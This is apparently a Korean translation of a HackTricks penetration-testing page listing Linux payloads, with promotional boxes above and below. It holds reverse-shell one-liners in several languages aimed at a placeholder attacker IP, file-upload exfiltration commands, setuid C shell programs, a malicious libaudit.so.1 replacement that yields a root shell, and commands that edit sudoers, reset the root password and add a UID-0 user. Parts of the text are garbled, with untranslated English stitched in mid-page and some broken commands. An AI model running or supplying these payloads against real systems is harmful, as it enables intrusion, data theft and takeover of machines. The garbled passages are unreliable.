# 실행할 페이로드

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기교를 공유하세요.

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

### Payloads to Execute

#### Shell Commands

To execute shell commands, you can use the following payloads:

- **Bash**: `bash -c "<command>"`
- **Sh**: `sh -c "<command>"`
- **Python**: `python -c "<command>"`
- **Perl**: `perl -e "<command>"`
- **Ruby**: `ruby -e "<command>"`
- **PHP**: `php -r "<command>"`
- **Node.js**: `node -e "<command>"`
- **Java**: `java -cp "<command>"`

Replace `<command>` with the desired shell command you want to execute.

#### Reverse Shells

To establish a reverse shell connection, you can use the following payloads:

- **Bash**: `bash -i >& /dev/tcp/<attacker-ip>/<attacker-port> 0>&1`
- **Netcat**: `nc -e /bin/sh <attacker-ip> <attacker-port>`
- **Python**: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",<attacker-port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- **Perl**: `perl -e 'use Socket;$i="<attacker-ip>";$p=<attacker-port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
- **Ruby**: `ruby -rsocket -e'f=TCPSocket.open("<attacker-ip>",<attacker-port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
- **PHP**: `php -r '$sock=fsockopen("<attacker-ip>",<attacker-port>);exec("/bin/sh -i <&3 >&3 2>&3");'`
- **Node.js**: `require('child_process').exec('nc -e /bin/sh <attacker-ip> <attacker-port>')`
- **Java**: `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<attacker-ip>/<attacker-port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()`

Replace `<attacker-ip>` with the IP address of your machine and `<attacker-port>` with the desired port for the reverse shell connection.

#### File Upload

To upload a file, you can use the following payloads:

- **Curl**: `curl -F "file=@<local-file-path>" <upload-url>`
- **Wget**: `wget --post-file=<local-file-path> <upload-url>`
- **Netcat**: `nc <upload-url> < <local-file-path>`
- **Python**: `python -c 'import requests; files = {"file": open("<local-file-path>", "rb")}; r = requests.post("<upload-url>", files=files)'`
- **Perl**: `perl -e 'use LWP::UserAgent; $ua = LWP::UserAgent->new; $ua->post("<upload-url>", Content_Type => "form-data", Content => [file => "<local-file-path>"])'`
- **Ruby**: `ruby -rnet/http -e 'Net::HTTP.post_form(URI("<upload-url>"), "file" => File.open("<local-file-path>"))'`
- **PHP**: `php -r '$c = curl_init(); curl_setopt($c, CURLOPT_URL, "<upload-url>"); curl_setopt($c, CURLOPT_POST, true); curl_setopt($c, CURLOPT_POSTFIELDS, array("file" => "@<local-file-path>")); curl_exec($c); curl_close($c);'`
- **Node.js**: `const fs = require('fs'); const request = require('request'); const formData = { file: fs.createReadStream('<local-file-path>') }; request.post({ url: '<upload-url>', formData: formData }, function(err, res, body) { console.log(body); });`
- **Java**: `import java.io.File; import org.apache.commons.httpclient.HttpClient; import org.apache.commons.httpclient.methods.PostMethod; import org.apache.commons.httpclient.methods.multipart.FilePart; import org.apache.commons.httpclient.methods.multipart.MultipartRequestEntity; import org.apache.commons.httpclient.methods.multipart.Part; HttpClient client = new HttpClient(); PostMethod post = new PostMethod("<upload-url>"); FilePart filePart = new FilePart("file", new File("<local-file-path>")); Part[] parts = { filePart }; post.setRequestEntity(new MultipartRequestEntity(parts, post.getParams())); client.executeMethod(post);`

Replace `<local-file-path>` with the path to the file you want to upload and `<upload-url>` with the URL where you want to upload the file.
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## 권한 상승을 위해 파일 덮어쓰기

### 일반적인 파일들

* _/etc/passwd_에 비밀번호가 있는 사용자 추가
* _/etc/shadow_ 내에서 비밀번호 변경
* _/etc/sudoers_에 사용자 추가
* 일반적으로 _/run/docker.sock_ 또는 _/var/run/docker.sock_에 위치한 도커 소켓을 통해 도커 남용

### 라이브러리 덮어쓰기

일부 이진 파일에서 사용되는 라이브러리를 확인하십시오. 이 경우 `/bin/su`를 사용합니다:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
이 경우에는 `/lib/x86_64-linux-gnu/libaudit.so.1`을 가장하는 것을 시도해보겠습니다.\
그래서 **`su`** 이진 파일에서 이 라이브러리에서 사용되는 함수를 확인하세요:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
심볼 `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` 및 `audit_fd`는 아마도 libaudit.so.1 라이브러리에서 가져온 것입니다. 악성 공유 라이브러리에 의해 libaudit.so.1이 덮어쓰여지므로 이러한 심볼은 새로운 공유 라이브러리에 있어야 합니다. 그렇지 않으면 프로그램은 심볼을 찾을 수 없어 종료될 것입니다.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
지금은 **`/bin/su`**를 호출하기만 하면 root로 쉘을 얻을 수 있습니다.

## 스크립트

루트가 무언가를 실행하도록 할 수 있나요?

### **www-data를 sudoers로 추가**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **루트 비밀번호 변경**

To change the root password, you can use the following command:

루트 비밀번호를 변경하려면 다음 명령을 사용할 수 있습니다:

```bash
sudo passwd root
```

You will be prompted to enter the new password twice. After successfully changing the password, you can log in as root using the new password.
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd에 새로운 root 사용자 추가하기

To add a new root user to the `/etc/passwd` file, you can follow these steps:

1. Open the `/etc/passwd` file using a text editor.
2. Locate the line that starts with `root` and copy it.
3. Paste the copied line at the end of the file.
4. Modify the username to a unique name for the new root user.
5. Change the user ID (UID) to `0`, which represents the root user.
6. Change the group ID (GID) to `0`, which represents the root group.
7. Update the home directory and shell fields if necessary.
8. Save the changes and exit the text editor.

After completing these steps, you will have successfully added a new root user to the `/etc/passwd` file.
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기교를 공유해주세요.

</details>
